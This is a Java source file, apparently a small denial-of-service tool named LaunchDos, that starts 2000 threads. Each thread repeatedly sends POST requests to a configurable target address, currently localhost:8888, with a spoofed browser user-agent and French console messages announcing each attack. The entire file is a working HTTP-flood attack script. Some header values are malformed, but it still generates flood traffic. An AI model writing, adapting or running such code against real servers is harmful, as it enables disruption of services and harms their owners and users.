package com.dos;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;


public class LaunchDos 
{

    public static String TargetedAdress ="http://localhost:8888";

    public static void main( String[] args ) throws Exception
    {
        for(int i = 0; i < 2000; i++ ){
            System.out.println("J'attaque : " + (i) + " fois. la machine : " +  TargetedAdress);
            dos thread = new dos();
            thread.start();
        }
    }


    public static class dos extends Thread{

        private AtomicBoolean running = new AtomicBoolean(true);
        private final String request = TargetedAdress;
        private final URL url;

        String param = null;

        public dos() throws Exception{
            url = new URL(request);
            param = "id =" + URLEncoder.encode("djizjzfp", "UTF-8");
        }

            @Override
            public void run(){
                while(running.get()){
                    try{
                        attack();
                    }catch( Exception e){
                        e.getStackTrace();
                    }
                }
            }

        public void attack() throws Exception{

            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset","utf-8");
            connection.setRequestProperty("Host", "localhost");
            connection.setRequestProperty("user-agent","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
            connection.setRequestProperty("Content-type", "application/x-wmw-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
            System.out.println(this + "" + connection.getResponseCode());
            connection.getInputStream();
        }
    }
}
